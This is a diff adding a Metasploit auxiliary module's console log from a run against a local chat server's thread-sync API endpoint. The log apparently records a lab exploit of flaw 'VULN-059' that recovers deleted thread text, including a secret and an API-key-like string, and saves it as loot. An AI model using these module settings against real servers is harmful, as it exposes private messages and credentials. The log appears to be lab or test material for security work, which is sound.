@@ -1,0 +1,19 @@
+Loaded 1 modules:
+    1 auxiliary modules
+RHOSTS => 127.0.0.1
+RPORT => 39649
+TARGETURI => /api/v1/chat.syncThreadsList
+SSL => false
+VERBOSE => true
+USERNAME => alice
+PASSWORD => Al1ce-Lab-Pass!
+ROOMID => GENERAL
+SINCE => 2000-01-01T00:00:00.000Z
+[*] Running module against 127.0.0.1
+[*] 127.0.0.1:39649 - Signed in as alice (user id rSQxouLt89hux5j4J)
+[+] 127.0.0.1:39649 - VULN-059: exploited
+[+] 127.0.0.1:39649 - 1 deleted thread root(s) returned with their original text
+[*]   id=6b055583e7422a44df31cb20 msg=secret-46ee97 api-key=AKIA46ee97
+[+] 127.0.0.1:39649 - Saved the response to /tmp/.msf4/loot/20261124200804_default_127.0.0.1_blue_spider.vuln_924626.txt
+[*] Auxiliary module execution completed
+whoami: cannot find name for user ID 997
